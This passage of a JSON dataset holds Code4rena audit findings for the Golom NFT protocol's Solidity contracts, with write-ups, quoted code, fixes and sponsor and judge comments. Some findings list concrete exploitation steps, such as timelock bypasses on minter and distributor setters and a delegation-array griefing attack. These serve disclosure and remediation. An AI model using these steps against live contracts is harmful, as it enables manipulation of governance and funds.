uint256[] memory _delegatedTokenIds\n        ) internal {\n            require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');\n\nA more likely scenario would be as follows:\n\n*   A proposal is live.\n*   Users delegate their voting power to addresses of their choosing.\n*   A and B are around the same voting power.\n*   A and B both have 400 delegatees.\n*   Malicious address A delegates minimum voting power 100 times to fill B's array to 500.\n*   Address A can self-delegate just a bit more to obtain more voting power.\n\n### Recommended Mitigation Steps\n\nFirstly, removing the ability to delegate the same lock NFT would make this griefing attack much more expensive. Even if that is patched, a griefing attack is still possible by simply creating more locks and delegating them all once.\n\nI believe that removing the 500 delegated token limit would prove to mitigate this issue.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/707)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/707#issuecomment-1236182307):**\n > We plan to keep sufficiently high `MIN_VOTING_POWER_REQUIRED` to prevent spam. \n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/707#issuecomment-1238341323):**\n > Removed the ability to delegate same NFT. If user is trying to delegate same NFT, the old delegation will be removed.\n> \n> Reference: https://github.com/golom-protocol/contracts/commit/c74d95b4105eeb878d2781982178db5ca08a1a9b\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/707#issuecomment-1279179694):**\n > I agree with the ranking of medium. This is a direct attack vector, but it's unlikely to be used.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the VoteEscrowDelegation.sol contract. This vulnerability allows malicious users to fill a victim's delegated token array with minimum voting power, reducing the victim's voting power to zero. This can be done by delegating a worthless token 500 times to the victim.\n\nThe vulnerability exists because there are no checks preventing against delegating the same lock NFT multiple times. There is also a limit of 500 delegated tokens per delegatee, meaning that an attacker can fill the victim's array with minimum voting power by delegating a worthless token 500 times.\n\nThe recommended mitigation steps are to remove the ability to delegate the same lock NFT, and to remove the 500 delegated token limit. This would make the griefing attack much more expensive, and would prevent the attacker from filling the victim's array with minimum voting power.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/707",
      "tags": [],
      "finders": [
        "0x52",
        "0xsanson",
        "simon135",
        "0xDjango",
        "MEP",
        "kenzo"
      ]
    },
    {
      "id": "8751",
      "title": "[M-14] `VoteEscrowDelegation._transferFrom` can only be executed by the token owner",
      "impact": "MEDIUM",
      "content": "\n`VoteEscrowDelegation._transferFrom` should be successfully executed if `msg.sender` is the current owner, an authorized operator, or the approved address. `removeDelegation` is called in `_transferFrom`. `removeDelegation` only accepts the token owner. Thus, `_transferFrom` can only be executed by the token owner.\n\n### Proof of Concept\n\n`removeDelegation` is called in `_transferFrom`<br>\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L242>\n\n        function _transferFrom(\n            address _from,\n            address _to,\n            uint256 _tokenId,\n            address _sender\n        ) internal override {\n            require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n\n            // remove the delegation\n            this.removeDelegation(_tokenId);\n\n            // Check requirements\n            require(_isApprovedOrOwner(_sender, _tokenId));\n            …\n        }\n\nHowever, `removeDelegation` only accept the token owner<br>\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L211>\n\n        function removeDelegation(uint256 tokenId) external {\n            require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n            uint256 nCheckpoints = numCheckpoints[tokenId];\n            Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];\n            removeElement(checkpoint.delegatedTokenIds, tokenId);\n            _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n        }\n\n### Recommended Mitigation Steps\n\nFix the permission control in `removeDelegation`.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/631)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/631#issuecomment-1236182667):**\n > Changed the `external` function to `public`. Users address will be passed as `msg.sender` now.<br>\n> https://github.com/golom-protocol/contracts/commit/10ec920765a5ee2afc2fe269d32ea9138d1156b6\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/631)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the permission control in the VoteEscrowDelegation smart contract. The `_transferFrom` function should be successfully executed if `msg.sender` is the current owner, an authorized operator, or the approved address. However, the `removeDelegation` function which is called in `_transferFrom` only accepts the token owner. This means that the `_transferFrom` function can only be executed by the token owner. To fix this, the permission control in `removeDelegation` should be changed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/631",
      "tags": [],
      "finders": [
        "GimelSec",
        "GalloDaSballo",
        "kenzo",
        "kebabsec"
      ]
    },
    {
      "id": "8750",
      "title": "[M-13] Rewards owed burned NFT in `RewardDistributor.sol` become irretrievable",
      "impact": "MEDIUM",
      "content": "\n[RewardDistributor.sol#L172-L210](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210)<br>\n\nRewards owed burned NFT are permanently locked.\n\n### Proof of Concept\n\n    function _burn(uint256 _tokenId) internal {\n        require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');\n\n        address owner = ownerOf(_tokenId);\n\n        // Clear approval\n        approve(address(0), _tokenId);\n        // Remove token\n        _removeTokenFrom(msg.sender, _tokenId);\n        emit Transfer(owner, address(0), _tokenId);\n    }\n\n    function _removeTokenFrom(address _from, uint256 _tokenId) internal {\n        // Throws if `_from` is not the current owner\n        assert(idToOwner[_tokenId] == _from);\n        // Change the owner\n        idToOwner[_tokenId] = address(0);\n        // Update owner token index tracking\n        _removeTokenFromOwnerList(_from, _tokenId);\n        // Change count tracking\n        ownerToNFTokenCount[_from] -= 1;\n    }\n\nAfter an NFT is burned, owner of token is set to `address(0)`.\n\n        rewardToken.transfer(tokenowner, reward);\n\nThis causes issues in multiStakerClaim L208. GOLOM uses OZ's implementation of ERC20 which doesn't allow tokens to be sent to `address(0)`. Because the \"owner\" of the burned NFT is `address(0)` multiStakerClaim will always revert when called for a burned NFT trapping rewards in contract forever.\n\n### Recommended Mitigation Steps\n\nImplement a clawback clause inside the multiStakerClaim function. If the token is burned (i.e. owned by address(0)) the rewards should be transferred to different address. These rewards could be claimed to the treasury or burned, etc.\n\n        if (tokenowner == address(0){\n            rewardToken.transfer(treasury, reward);\n            weth.transfer(treasury, rewardEth);\n        }\n\n**[0xsaruman (Golom) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/86#issuecomment-1230541517):**\n > I think its QA because burning NFT means the owner doesn't want anything to do with rewards or the NFT anymore.\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes an issue with the RewardDistributor.sol contract, located on the github repository at the given link. The issue is that when an NFT is burned, the owner of the token is set to address(0). This causes an issue in the multiStakerClaim function, which uses OZ's implementation of ERC20, which does not allow tokens to be sent to address(0). As a result, the rewards are trapped in the contract forever.\n\nThe impact of this bug is that rewards owed to burned NFTs are permanently locked.\n\nThe proof of concept for this bug is provided in the report, and tools used are not specified.\n\nThe recommended mitigation step for this bug is to implement a clawback clause inside the multiStakerClaim function. If the token is burned (i.e. owned by address(0)), the rewards should be transferred to a different address. These rewards could be claimed to the treasury or burned, etc.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/86",
      "tags": [],
      "finders": [
        "kyteg",
        "0x52"
      ]
    },
    {
      "id": "8749",
      "title": "[M-12] Some setters' timelock can be bypassed",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L58-L72><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L444-L457><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L298-L311><br>\n\nMED - Function could be impacted\n\nAs the timelock does not work as supposed to work, the owner of the contract can bypass timelock.\n\n*   Affected Functions:\n    *   `GolomToken`: `setMinter`, `executeSetMinter`\n    *   `GolomTrader`: `setDistributor`, `executeSetDistributor`\n    *   `RewardDistributor`: `addVoteEscrow`, `executeAddVoteEscrow`\n\n### Proof of Concept\n\n*   [GolomTrader::it can bypass timelock poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtrader-specs-ts-diff-L15-L26)\n*   [GolomToken::setMinter it should set the minter with timelock poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtoken-specs-ts-diff-L10-L29)\n\nThe [first poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtrader-specs-ts-diff-L15-L26) shows to bypass timelock for `GolomTrader::setDistributor`. The same logic applies for the `RewardDistributor::addVoteEscrow`.<br>\n0\\. The `setDistributor` was called once in the beforeEach block to set the initial distributor. For this exploit to work, the `setDistributor` should be called only once. If `setDistributor` was called more than once, one can set the distributor to zero address (with timelock like in the `GolomToken` case, then set to a new distributor after that)\n\n1.  reset distributor to zero address without timelock by calling `executeSetDistributor`\n2.  set a new distributor without timelock by calling `setDistributor`\n3.  Rinse and repeat: as long as `setDistributor` is not called multiple times in row, the owner can keep setting distributor without timelock.\n\nA little bit different variation of timelock bypass was found in the `GolomToken`. Although the owner should wait for the timelock to set the minter to zero address, but after that, the owner can set to the new minter without waiting for a timelock. Since the meaning of timelock is to let people know the new minter's implementation, if the owner can bypass that, the timelock is almost meaningless.<br>\nThe exploitation steps: [the second proof of concept](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtoken-specs-ts-diff-L10-L29)\n\n1.  call `setMineter` with zero address\n2.  wait for the timelock\n3.  call `executeSetMineter` to set the minter to zero address\n4.  now the onwer can call `setMineter` with any address and call `executeSetMinter` without waiting for the timelock\n\nThe owner can call `executeSetdistributor` even though there is no `pendingDistributor` set before. Also, `setDistributor` sets the new distributor without timelock when the existing distributor's address is zero.\n\n```solidity\n// GolomTrader\n// almost identical logic was used in `RewardDistributor` to addVoteEscrow\n// similar logic was used in `GolomToken` to `setMineter`\n\n\n444     function setDistributor(address _distributor) external onlyOwner {\n445         if (address(distributor) == address(0)) {\n446             distributor = Distributor(_distributor);\n447         } else {\n448             pendingDistributor = _distributor;\n449             distributorEnableDate = block.timestamp + 1 days;\n450         }\n451     }\n452\n453     /// @notice Executes the set distributor function after the timelock\n454     function executeSetDistributor() external onlyOwner {\n455         require(distributorEnableDate <= block.timestamp, 'not allowed');\n456         distributor = Distributor(pendingDistributor);\n457     }\n```\n\n### Recommended Mitigation Steps\n\nTo mitigate, execute functions can check whether pendingDistributor is not zero. It will ensure that the setters are called before executing them, as well as prevent to set to zero addresses.\n\n**[0xsaruman (Golom) disputed and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/698#issuecomment-1216949773):**\n > call setMineter with zero address<br>\n> wait for the timelock\n> \n> This alone will trigger awareness that something malicious is happening and since timelock is there people have time to get out.\n\n**[0xsaruman (Golom) confirmed and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/698#issuecomment-1219749160):**\n > The second POC is valid.\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/698#issuecomment-1236738770):**\n > Removed all secondary time locks in the contract and only using the primary timelock that will be behind the owner.\n>\n > https://github.com/golom-protocol/contracts/commit/366c0455547041003c28f21b9afba48dc33dc5c7#diff-94d75c3059a714c355bd15d139c30d4f9899df283d29717622ffd5c930445499R59\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that could be exploited in the code of the GolomToken, GolomTrader, and RewardDistributor smart contracts. The vulnerability would allow the owner of the contract to bypass the timelock, meaning they could set the minter and distributor without waiting for the timelock to expire. This could have a medium impact on the function of the contract. \n\nTwo proof of concept scenarios have been provided. The first one shows how to bypass the timelock for the GolomTrader::setDistributor and the same logic applies for the RewardDistributor::addVoteEscrow. The steps for this exploit include resetting the distributor to a zero address without a timelock and then setting a new distributor without the timelock. \n\nThe second proof of concept shows how to bypass the timelock for the GolomToken::setMinter. This exploit involves calling the setMinter with a zero address, waiting for the timelock to expire, then calling the executeSetMinter to set the minter to zero address. After that, the owner can call the setMinter with any address and call the executeSetMinter without waiting for the timelock. \n\nThe owner can also call the executeSetDistributor even though there is no pendingDistributor set before. Furthermore, the setDistributor can be set to a new distributor without a timelock when the existing distributor's address is zero. \n\nNo tools were used for this vulnerability. The recommended mitigation steps to prevent this exploit from happening include executing functions that check whether the pendingDistributor is not zero. This will ensure that the setters are called before executing them, as well as prevent setting to zero addresses.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/698",
      "tags": [],
      "finders": [
        "GiveMeTestEther",
        "berndartmueller",
        "zzzitron",
        "GimelSec",
        "sseefried"
      ]
    },
    {
      "id": "8748",
      "title": "[M-11] When `MIN_VOTING_POWER_REQUIRED` is changed, previous votes are not affected",
      "impact": "MEDIUM",
      "content": "\nWhen `MIN_VOTING_POWER_REQUIRED` is changed, tokenIDs with votes lower than `MIN_VOTING_POWER_REQUIRED` will not be able to vote through the delegate function, but previous votes will not be affected.<br>\nSince `MIN_VOTING_POWER_REQUIRED` is mainly used to reduce the influence of spam users, changing this value should affect previous votes.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L168-L194><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L260-L262><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L73-L74><br>\n\n### Recommended Mitigation Steps\n\nIn the getPriorVotes and getVotes functions, when the balance corresponding to tokenId is less than MIN_VOTING_POWER_REQUIRED, the value of votes will not be increased\n\n```diff\n    function getVotes(uint256 tokenId) external view returns (uint256) {\n        uint256[] memory delegated = _getCurrentDelegated(tokenId);\n        uint256 votes = 0;\n        for (uint256 index = 0; index < delegated.length; index++) {\n+         if(this.balanceOfNFT(delegated[index]) >= MIN_VOTING_POWER_REQUIRED){\n            votes = votes + this.balanceOfNFT(delegated[index]);\n+       }\n        }\n        return votes;\n    }\n\n\n    /**\n     * @notice Determine the prior number of votes for an account as of a block number\n     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.\n     * @param tokenId The address of the account to check\n     * @param blockNumber The block number to get the vote balance at\n     * @return The number of votes the account had as of the given block\n     */\n    function getPriorVotes(uint256 tokenId, uint256 blockNumber) public view returns (uint256) {\n        require(blockNumber < block.number, 'VEDelegation: not yet determined');\n        uint256[] memory delegatednft = _getPriorDelegated(tokenId, blockNumber);\n        uint256 votes = 0;\n        for (uint256 index = 0; index < delegatednft.length; index++) {\n+         if(this.balanceOfAtNFT(delegatednft[index], blockNumber) >= MIN_VOTING_POWER_REQUIRED){\n            votes = votes + this.balanceOfAtNFT(delegatednft[index], blockNumber);\n+         }\n        }\n        return votes;\n    }\n```\n\n**[zeroexdead (Golom) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/626)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/626#issuecomment-1236182938):**\n > When calling we `getVotes()` and `getPriorVotes()` we're considering `MIN_VOTING_POWER_REQUIRED`.<br>\n> Reference: https://github.com/golom-protocol/contracts/commit/db650729b0805ec19906a0ea11de6af7a53ac382\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/626)**\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/626#issuecomment-1279184086):**\n > Downgrading this to medium. Assets are not at direct risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the VoteEscrowDelegation.sol contract. The vulnerability occurs when the MIN_VOTING_POWER_REQUIRED value is changed. This value is used to reduce the influence of spam users, and when it is changed, tokenIDs with votes lower than MIN_VOTING_POWER_REQUIRED will not be able to vote through the delegate function, but the votes already cast will not be affected.\n\nThe impact of this vulnerability is that when MIN_VOTING_POWER_REQUIRED is changed, the votes from tokenIDs with votes lower than MIN_VOTING_POWER_REQUIRED will not be counted, even though they were cast prior to the change.\n\nThe recommended mitigation steps for this vulnerability are to modify the getVotes and getPriorVotes functions so that when the balance corresponding to tokenId is less than MIN_VOTING_POWER_REQUIRED, the value of votes will not be increased. This will ensure that the votes from tokenIDs with votes lower than MIN_VOTING_POWER_REQUIRED will not be counted.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/626",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "8747",
      "title": "[M-10] Delegated NFTs that are withdrawn while still delegated will remain delegated even after burn",
      "impact": "MEDIUM",
      "content": "\n[VoteEscrowCore.sol#L1226-L1236](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236)<br>\n\nBurn NFTs remained delegated causing bloat and wasting gas.\n\n### Proof of Concept\n\nVoteEscrowDelegation.sol doesn't change the withdraw or \\_burn functions inherited from VoteEscrowCore.sol. These functions are ignorant of the delegation system and don't properly remove the delegation when burning an NFT. The votes for the burned NFT will be removed but the reference will still be stored in the delegation list where it was last delegated. This creates a few issues. 1) It adds bloat to both getVotes and getPriorVotes because it adds a useless element that must be looped through. 2) The max number of users that can delegate to another NFT is 500 and the burned NFT takes up one of those spots reducing the number of real users that can delegate. 3) Adds gas cost when calling removeDelegation which adds gas cost to \\_transferFrom because removeElement has to cycle through a larger number of elements.\n\n### Recommended Mitigation Steps\n\nOverride \\_burn in VoteEscrowDelegation and add this.removeDelegation(\\_tokenId), similar to how it was done in \\_transferFrom.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/59)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/59#issuecomment-1236184219):**\n > Fixed.<br>\n> Ref: https://github.com/golom-protocol/contracts/commit/a30a50abe1aa677374bdbf68e1e81d80e1545563\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/59)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/59#issuecomment-1279177352):**\n > I agree with the wardens and sponsor who rate this as medium. It does negatively impact the functioning of the protocol, but none of the reporting wardens have shown how it can be used as a direct attack vector IMO.\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on an issue with the VoteEscrowDelegation.sol code in the 2022-07-golom GitHub repository. The bug affects the _burn function inherited from VoteEscrowCore.sol. The issue is that when an NFT is burned, the votes for that NFT are removed but the reference of the NFT is still stored in the delegation list. This causes a few issues, such as adding bloat to the getVotes and getPriorVotes functions, reducing the number of real users that can delegate, and adding gas cost when calling removeDelegation.\n\nThe recommended mitigation step is to override _burn in VoteEscrowDelegation and add this.removeDelegation(_tokenId), similar to how it was done in _transferFrom. This will ensure that when an NFT is burned, the reference to it is removed from the delegation list. This will help reduce bloat, increase the number of users that can delegate, and reduce the gas cost when calling removeDelegation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/59",
      "tags": [],
      "finders": [
        "IllIllI",
        "0x52",
        "rotcivegaf",
        "berndartmueller",
        "kenzo"
      ]
    },
    {
      "id": "8746",
      "title": "[M-09] `GolomToken.sol` doesn't contain a function to mint treasury tokens",
      "impact": "MEDIUM",
      "content": "\n[GolomToken.sol#L14-L73](https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L14-L73)<br>\n\nPotential downtime in GolomTrader\n\n### Proof of Concept\n\nGolomToken.sol doesn't have a function to mint the treasury tokens as specified in the docs (<https://docs.golom.io/tokenomics-and-airdrop>). In order for these tokens to be minted, the minter would have to be changed via `setMinter()` and `executeSetMinter()` to a contract that can mint the treasury tokens. Because of the 24 hour timelock, this would lead to downtime for GolomTrader.sol if trading has already begun. This is because GolomTrader.sol calls `RewardDistributor.sol#addFees` each time there is a filled order. When the epoch changes, RewardDistributor.sol will try to call the mint function in GolomToken.sol. Because of the timelock, there will be at least a 24 hours period where RewardDistributor.sol is not the minter and doesn't have the permission to mint. This means that during that period all trades will revert.\n\n### Recommended Mitigation Steps\n\nAdd a function to GolomToken.sol to mint the treasury tokens similar to the `mintAirdrop()` and `mintGenesisReward()` functions.\n\n**[0xsaruman (Golom) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-07-golom-findings/issues/205)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/205#issuecomment-1236300333):**\n > https://github.com/golom-protocol/contracts/commit/746507ea6f71a017be178f7eeb66d2dbf92a4524\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the GolomToken.sol code which may lead to potential downtime in GolomTrader. This is because GolomTrader.sol calls RewardDistributor.sol#addFees each time there is a filled order. When the epoch changes, RewardDistributor.sol will try to call the mint function in GolomToken.sol. However, because of the 24 hour timelock, there will be at least a 24 hours period where RewardDistributor.sol is not the minter and doesn't have the permission to mint. This means that during that period all trades will revert. To mitigate this, a function should be added to GolomToken.sol to mint the treasury tokens similar to the mintAirdrop() and mintGenesisReward() functions.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/205",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "8745",
      "title": "[M-08] Pre-check is not correct",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L342><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L397><br>\n\n`fillCriteriaBid` can be reverted due to the pre-check while it can work.\n\n### Proof of Concept\n\nWhen `refererrAmt > 0` and `referrer` address is not set (is 0),\n`(o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt >= 0` and `o.totalAmt < o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt` can hold true at the same time.\n\nIt is when `o.refererrAmt > (p.paymentAmt + protocolfee) / amount`.<br>\nIn that case, `_settleBalances` can work, but fillCriteriaBid will be reverted due to the check in line 342.\n\n### Recommended Mitigation Steps\n\nI think `require(o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt)` is correct.\n\n**[0xsaruman (Golom) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/851#issuecomment-1234195947):**\n > Very small chance of both conditions happening, `o.refererrAmt > (p.paymentAmt + protocolfee) / amount` and referrer address is 0.\n>\n > Resolved https://github.com/golom-protocol/contracts/commit/c15fa96271d8cf764274271eee649c79ca1b1f7d\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/851#issuecomment-1277666029):**\n > Nice catch.\n> \n> This tracks as a medium for me... it breaks protocol functionality given external factors.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the GolomTrader.sol contract. The vulnerability is that `fillCriteriaBid` can be reverted due to a pre-check while it can work. A proof of concept has been provided which demonstrates that when `refererrAmt > 0` and `referrer` address is not set (is 0), `(o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt >= 0` and `o.totalAmt < o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt` can hold true at the same time. This happens when `o.refererrAmt > (p.paymentAmt + protocolfee) / amount`. In this case, `_settleBalances` can work, but `fillCriteriaBid` will be reverted due to the check in line 342. \n\nThe recommended mitigation step is to add the requirement that `o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt`. Manual review was used to identify this vulnerability.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/851",
      "tags": [],
      "finders": [
        "0xSky"
      ]
    },
    {
      "id": "8744",
      "title": "[M-07] veNFT withdraw and merge fail for approved callers",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893-L908><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1004-L1030><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236><br>\n\nGolom is impacted by a known issue with the veNFT contract that causes the `merge` and `withdraw` functions to revert when called by an approved spender rather than the token owner.\n\n`merge` and `withdraw` may both be called by either the token owner or an approved spender. Note that both of these functions check `_isApprovedOrOwner`:\n\n[`VoteEscrowCore#merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893-L908)\n\n```solidity\n    function merge(uint256 _from, uint256 _to) external {\n        require(attachments[_from] == 0 && !voted[_from], 'attached');\n        require(_from != _to);\n        require(_isApprovedOrOwner(msg.sender, _from));\n        require(_isApprovedOrOwner(msg.sender, _to));\n\n        LockedBalance memory _locked0 = locked[_from];\n        LockedBalance memory _locked1 = locked[_to];\n        uint256 value0 = uint256(int256(_locked0.amount));\n        uint256 end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;\n\n        locked[_from] = LockedBalance(0, 0);\n        _checkpoint(_from, _locked0, LockedBalance(0, 0));\n        _burn(_from);\n        _deposit_for(_to, value0, end, _locked1, DepositType.MERGE_TYPE);\n    }\n```\n\n[`VoteEscrowCore#withdraw`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1004-L1030)\n\n```solidity\n    /// @notice Withdraw all tokens for `_tokenId`\n    /// @dev Only possible if the lock has expired\n    function withdraw(uint256 _tokenId) external nonreentrant {\n        assert(_isApprovedOrOwner(msg.sender, _tokenId));\n        require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');\n\n        LockedBalance memory _locked = locked[_tokenId];\n        require(block.timestamp >= _locked.end, \"The lock didn't expire\");\n        uint256 value = uint256(int256(_locked.amount));\n\n        locked[_tokenId] = LockedBalance(0, 0);\n        uint256 supply_before = supply;\n        supply = supply_before - value;\n\n        // old_locked can have either expired <= timestamp or zero end\n        // _locked has only 0 end\n        // Both can have >= 0 amount\n        _checkpoint(_tokenId, _locked, LockedBalance(0, 0));\n\n        assert(IERC20(token).transfer(msg.sender, value));\n\n        // Burn the NFT\n        _burn(_tokenId);\n\n        emit Withdraw(msg.sender, _tokenId, value, block.timestamp);\n        emit Supply(supply_before, supply_before - value);\n    }\n```\n\nHowever, both functions make internal calls to `_burn`, which does **not** handle the case of an approved caller correctly. The call to `_removeTokenFrom` on [L1234](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1234-L1235) passes `msg.sender` rather than the token `owner`, which will revert:\n\n[`VoteEscrowCore#_burn`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236)\n\n```solidity\n    function _burn(uint256 _tokenId) internal {\n        require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');\n\n        address owner = ownerOf(_tokenId);\n\n        // Clear approval\n        approve(address(0), _tokenId);\n        // 